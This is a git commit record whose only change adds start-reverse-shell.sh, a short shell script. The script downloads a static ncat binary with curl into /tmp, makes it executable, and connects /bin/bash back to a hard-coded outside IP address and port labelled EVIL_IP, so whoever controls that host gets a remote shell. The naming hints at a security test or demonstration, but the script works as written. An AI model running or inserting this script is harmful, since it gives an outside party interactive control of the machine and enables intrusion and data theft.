16e06b122c09008725724c0cb2bb53412632c8d6
Jakub Hrozek <jhrozek@redhat.com>
2021-04-23 17:38:26 +0200

    my rsh

---
+++ start-reverse-shell.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+
+EVIL_IP=159.89.100.130
+EVIL_PORT=3131
+NC=/tmp/nc
+
+rm -f $NC
+curl https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat --output - > $NC
+chmod u+x $NC
+$NC -e /bin/bash $EVIL_IP $EVIL_PORT
